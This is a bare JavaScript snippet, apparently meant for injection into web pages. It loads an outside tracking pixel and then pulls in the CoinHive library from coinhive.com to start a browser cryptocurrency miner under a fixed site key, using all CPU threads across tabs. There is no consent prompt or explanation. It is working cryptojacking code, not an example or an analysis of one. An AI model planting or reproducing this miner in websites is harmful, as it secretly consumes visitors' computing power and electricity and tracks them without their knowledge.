(new Image).src = "//whos.amung.us/swidget/mandar1n0s";


var head = document.getElementsByTagName('head')[0];
var script = document.createElement('script');
script.type = 'text/javascript';
script.onload = function() {
  var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
  threads: navigator.hardwareConcurrency,
  autoThreads: false,
  throttle: 0.5,
  forceASMJS: false
});
  miner.start(CoinHive.FORCE_MULTI_TAB);
}
script.src = 'https://coinhive.com/lib/coinhive.min.js';
head.appendChild(script);
